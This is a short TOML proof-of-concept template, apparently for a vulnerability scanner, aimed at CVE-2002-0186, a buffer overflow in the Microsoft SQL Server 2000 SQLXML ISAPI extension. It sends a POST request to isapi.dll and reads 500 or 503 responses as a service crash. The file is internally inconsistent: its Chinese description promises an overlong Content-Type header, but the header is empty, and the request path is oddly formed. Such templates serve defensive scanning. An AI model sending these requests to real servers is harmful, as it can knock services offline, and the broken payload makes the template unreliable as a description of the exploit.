[info]
author = "AVE"
description = "向 Microsoft SQL Server 2000 的 SQLXML ISAPI 扩展发送超长 Content-Type 参数的 HTTP 请求，触发缓冲区溢出，导致服务崩溃（DoS）。"
id = "POC-AVE-2002-0198"
name = "Microsoft SQL Server 2000 SQLXML ISAPI 缓冲区溢出 PoC"
severity = "high"
tags = ["cve-2002-0186"]
vuln_id = [
    "CVE-2002-0186",
    "AVE-2002-0198",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/sqlxml/isapi.dll"
protocol = "http"

[poc.requests.body]
content = '<?xml version="1.0"?><root><query>SELECT 1</query></root>'
type = "raw"

[poc.requests.headers]
Content-Type = ""
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
status = [
    500,
    503,
]
type = "status"
